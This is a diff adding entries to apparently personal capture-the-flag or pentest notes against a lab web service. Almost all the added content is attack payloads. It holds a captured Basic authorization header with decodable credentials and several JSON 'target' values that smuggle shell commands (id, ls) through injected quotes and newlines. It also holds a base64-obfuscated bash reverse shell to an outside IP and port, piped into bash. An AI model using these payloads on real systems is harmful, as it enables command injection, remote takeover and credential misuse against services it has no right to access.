@@ -181,7 +181,24 @@ port 27017 => mongodb
 #show dbs;
 #show collections;
 #db.user.find();
+____________________________________________________________________________________________________________________________________
+Authorization: Basic cmFzY2FsOm1hZ2ljaw==  (original in burpsuite)
+Connection: close
+Referer: http://10.10.149.114/
 
+{"target":""}
+
+#Command Injection
+--------------------
+{"target":"\" ;id\n"}
+{"target":"\" ;/usr/bin/id\n"}
+{"target":"\" \n/usr/bin/id\n"}
+{"target":"\" \n/bin/ls -al\n"}
+
+reverse shell
+--------------
+change bash reverse shell into base64
+{"target":"\" \necho YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjUyLjE3LzEyMzQgMD4mMQo=  | base64 -d | bash\n"}
 
 
 
